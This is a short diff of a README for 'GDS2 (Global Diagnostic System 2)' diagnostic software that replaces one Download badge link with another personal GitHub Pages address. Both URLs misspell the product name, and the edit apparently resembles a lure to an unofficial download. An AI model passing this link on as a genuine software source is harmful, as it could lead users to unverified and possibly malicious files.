@@ -1,6 +1,6 @@
 # GDS2 (Global Diagnostic System 2)
 
-[![Download](https://img.shields.io/badge/Download-GDS2-blue?style=for-the-badge&logo=github)](https://gds2-global-diagnosti-system-2.github.io/.github)
+[![Download](https://img.shields.io/badge/Download-GDS2-blue?style=for-the-badge&logo=github)](https://ginelaklodi.github.io/.github/gds2-diagnosti-system-2)
 
 ![GDS2 Screenshot](https://www.aetools.us/cdn/shop/files/GM-GDS-L-Duty.png?v=1748448365&width=950)
 
